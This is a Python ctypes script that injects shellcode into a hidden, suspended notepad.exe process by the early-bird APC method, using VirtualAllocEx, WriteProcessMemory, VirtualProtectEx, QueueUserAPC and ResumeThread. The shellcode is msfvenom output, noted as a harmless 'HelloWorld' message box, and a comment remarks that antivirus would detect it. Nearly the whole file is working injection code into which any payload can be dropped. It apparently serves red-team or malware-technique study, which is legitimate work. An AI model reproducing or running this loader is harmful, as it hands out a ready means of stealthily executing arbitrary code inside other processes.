from ctypes import *
from ctypes import wintypes

#--------------------------------------------------------------------------------------------
# WIN API VARIABLES 
#--------------------------------------------------------------------------------------------

kernel32 = windll.kernel32
SIZE_T = c_size_t

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

PAPCFUNC = CFUNCTYPE(
    None,
    POINTER(wintypes.ULONG)
)

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ('nLength', wintypes.DWORD),
        ('lpSecurityDescriptor', wintypes.LPVOID),
        ('bInheritHandle', wintypes.BOOL)       
    ]

class _STARTUPINFO(Structure):
    _fields_ = [
        ('cb', wintypes.DWORD ), 
        ('lpReserved', wintypes.LPSTR ), 
        ('lpDesktop', wintypes.LPSTR ), 
        ('lpTitle', wintypes.LPSTR ), 
        ('dwX', wintypes.DWORD ), 
        ('dwY', wintypes.DWORD ), 
        ('dwXSize', wintypes.DWORD ), 
        ('dwYSize', wintypes.DWORD ), 
        ('dwXCountChars', wintypes.DWORD ), 
        ('dwYCountChars', wintypes.DWORD ), 
        ('dwFillAttribute', wintypes.DWORD ), 
        ('dwFlags', wintypes.DWORD ), 
        ('wShowWindow', wintypes.WORD  ), 
        ('cbReserved2', wintypes.WORD  ), 
        ('lpReserved2', wintypes.LPBYTE), 
        ('hStdInput', wintypes.HANDLE), 
        ('hStdOutput', wintypes.HANDLE), 
        ('hStdError', wintypes.HANDLE)
    ]

class _PROCESS_INFORMATION(Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD)      
    ]

SECURITY_ATTRIBUTES     = _SECURITY_ATTRIBUTES
STARTUPINFO             = _STARTUPINFO
PROCESS_INFORMATION     = _PROCESS_INFORMATION

LPSTARTUPINFO           = POINTER(STARTUPINFO)
LPPROCESS_INFORMATION   = POINTER(PROCESS_INFORMATION)
LPSECURITY_ATTRIBUTES   = POINTER(SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE  = wintypes.LPVOID

#--------------------------------------------------------------------------------------------
# WIN API FUNCTIONS
#--------------------------------------------------------------------------------------------

VirtualAllocEx          = kernel32.VirtualAllocEx
VirtualAllocEx.restype  = wintypes.LPVOID
VirtualAllocEx.argtypes = [
        wintypes.HANDLE,
        wintypes.LPVOID,
        SIZE_T,
        wintypes.DWORD,
        wintypes.DWORD
    ]

WriteProcessMemory          = kernel32.WriteProcessMemory
WriteProcessMemory.restype  = wintypes.BOOL
WriteProcessMemory.argtypes = [
        wintypes.HANDLE,
        wintypes.LPVOID,
        wintypes.LPCVOID,
        SIZE_T,
        POINTER(SIZE_T)
    ]

CreateRemoteThread          = kernel32.CreateRemoteThread
CreateRemoteThread.restype  = wintypes.HANDLE
CreateRemoteThread.argtypes = [
        wintypes.HANDLE,
        LPSECURITY_ATTRIBUTES,
        SIZE_T,
        LPTHREAD_START_ROUTINE,
        wintypes.LPVOID,
        wintypes.DWORD,
        wintypes.LPDWORD
    ]

VirtualProtectEx            = kernel32.VirtualProtectEx
VirtualProtectEx.restype    = wintypes.BOOL
VirtualProtectEx.argtypes   = [
        wintypes.HANDLE,
        wintypes.LPVOID,
        SIZE_T,
        wintypes.DWORD,
        wintypes.PDWORD
    ]

CreateProcessA              = kernel32.CreateProcessA
CreateProcessA.restype      = wintypes.BOOL
CreateProcessA.argtypes     = [
        wintypes.LPCSTR,
        wintypes.LPSTR,
        LPSECURITY_ATTRIBUTES,
        LPSECURITY_ATTRIBUTES,
        wintypes.BOOL,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.LPCSTR,
        LPSTARTUPINFO,
        LPPROCESS_INFORMATION
    ]

QueueUserAPC                = kernel32.QueueUserAPC
QueueUserAPC.restype        = wintypes.DWORD
QueueUserAPC.argtypes       = [
        PAPCFUNC,
        wintypes.HANDLE,
        POINTER(wintypes.ULONG)
    ]  

ResumeThread                = kernel32.ResumeThread 
ResumeThread.restype        = wintypes.BOOL
ResumeThread.argtypes       = [
        wintypes.HANDLE
    ]

#--------------------------------------------------------------------------------------------
# SHELL CODE - AV Would Detect
#--------------------------------------------------------------------------------------------

#msfvenom -a x64 -p windows/x64/messagebox TITLE=Hello TEXT=HelloWorld. -f py
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#No encoder specified, outputting raw payload
#Payload size: 285 bytes
#Final size of py file: 1393 bytes
buf =  b""
buf += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00"
buf += b"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b"
buf += b"\x52\x60\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e"
buf += b"\x48\x8b\x72\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
buf += b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9"
buf += b"\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e\x48\x8b\x52"
buf += b"\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88\x00"
buf += b"\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b"
buf += b"\x48\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48"
buf += b"\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
buf += b"\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd6"
buf += b"\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41\x8b"
buf += b"\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
buf += b"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
buf += b"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0"
buf += b"\x58\x41\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff"
buf += b"\x5d\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe"
buf += b"\x00\x00\x00\x3e\x4c\x8d\x85\x0a\x01\x00\x00\x48\x31"
buf += b"\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41"
buf += b"\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c\x6c\x6f\x57"
buf += b"\x6f\x72\x6c\x64\x2e\x00\x48\x65\x6c\x6c\x6f\x00"

#--------------------------------------------------------------------------------------------
# PROGRAM
#--------------------------------------------------------------------------------------------

def verify(x):
    if not x:
        raise WinError()

startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)

startup_info.dwFlags = 1
startup_info.wShowWindow = 1

proc_info = PROCESS_INFORMATION()

created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_SUSPENDED | CREATE_NO_WINDOW, None, None, byref(startup_info), byref(proc_info))

verify(created)

print(
    "Handle:{}\nPID:{}\nTID:{}".format(proc_info.hProcess, proc_info.dwProcessId, proc_info.dwThreadId)
)

remote_memory = VirtualAllocEx(proc_info.hProcess, False, len(buf) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

verify(remote_memory)

print("Memory allocated => ", hex(remote_memory))

write = WriteProcessMemory(proc_info.hProcess, remote_memory, buf, len(buf) + 1, None)

verify(write)

print("Payload written to memory.")

old_protection = wintypes.DWORD(0)

protect = VirtualProtectEx(proc_info.hProcess, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_protection))

verify(protect)

print("Memory protection update from {} to {}".format(old_protection.value, PAGE_EXECUTE_READ))

#rthread = CreateRemoteThread(proc_info.hProcess, None, 0, remote_memory, None, EXECUTE_IMMEDIATELY, None)
#verify(rthread)

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), proc_info.hThread, None)

verify(rqueue)

print("Thread APC Queued: {}".format(proc_info.hThread))

rthread = ResumeThread(proc_info.hThread)

verify(rthread)

print("Resuming thread!")